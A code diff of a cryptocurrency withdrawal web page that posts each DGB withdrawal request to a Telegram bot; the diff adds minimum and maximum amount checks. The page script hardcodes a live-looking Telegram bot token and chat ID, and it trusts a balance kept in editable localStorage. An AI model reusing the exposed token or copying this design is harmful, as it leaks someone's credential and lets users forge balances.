@@ -99,52 +99,57 @@
 
         <div class="button-container">
             <button onclick="submitWithdraw()">Submit Withdrawal</button>
-            <button onclick="goBack()">Back</button>
+            <button onclick="goBack()">🔙 Back</button>
         </div>
     
     </div>
 
     <script>
-        const botToken = "7233487877:AAEfL184Kt4Q9jt_2CP7KqU0WGxWNR2R5_Y";
-        const chatId = "5776979420";
+    const botToken = "7233487877:AAEfL184Kt4Q9jt_2CP7KqU0WGxWNR2R5_Y";
+    const chatId = "5776979420";
 
-        let balance = parseFloat(localStorage.getItem("balance")) || 0;
-        document.getElementById("availableBalance").textContent = balance.toFixed(2);
+    let balance = parseFloat(localStorage.getItem("balance")) || 0;
+    document.getElementById("availableBalance").textContent = balance.toFixed(2);
 
-        function submitWithdraw() {
-            const amount = parseFloat(document.getElementById("amount").value);
-            const method = document.getElementById("method").value;
-            const address = document.getElementById("address").value;
+    function submitWithdraw() {
+        const amount = parseFloat(document.getElementById("amount").value);
+        const method = document.getElementById("method").value;
+        const address = document.getElementById("address").value;
 
-            if (amount > balance) {
-                alert("Insufficient balance!");
-            } else if (!address) {
-                alert("Please enter an address!");
-            } else {
-                balance -= amount;
-                localStorage.setItem("balance", balance);
-                document.getElementById("availableBalance").textContent = balance.toFixed(2);
+        // Validation for amount
+        if (amount < 20) {
+            alert("The minimum withdrawal amount is 20!");
+        } else if (amount > 1000) {
+            alert("The maximum withdrawal amount is 1000!");
+        } else if (amount > balance) {
+            alert("Insufficient balance!");
+        } else if (!address) {
+            alert("Please enter an address!");
+        } else {
+            balance -= amount;
+            localStorage.setItem("balance", balance);
+            document.getElementById("availableBalance").textContent = balance.toFixed(2);
 
-                const message = `
+            const message = `
 💵 *Withdrawal Request Submitted* 💵
 Amount: ${amount} DGB
 Method: ${method}
 Address: ${address}
-                `;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: message }),
-
-                });
-                alert("Withdrawal request submitted!");
-            }
+            `;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message }),
+            });
+            alert("Withdrawal request submitted!");
         }
+    }
 
-        function goBack() {
-            // Replace this URL with the URL you want to navigate to
-            window.location.href = "index.html"; // Replace with the desired link
-        }
-    </script>
+    function goBack() {
+        // Replace this URL with the URL you want to navigate to
+        window.location.href = "index.html"; // Replace with the desired link
+    }
+</script>
+
 </body>
 </html>
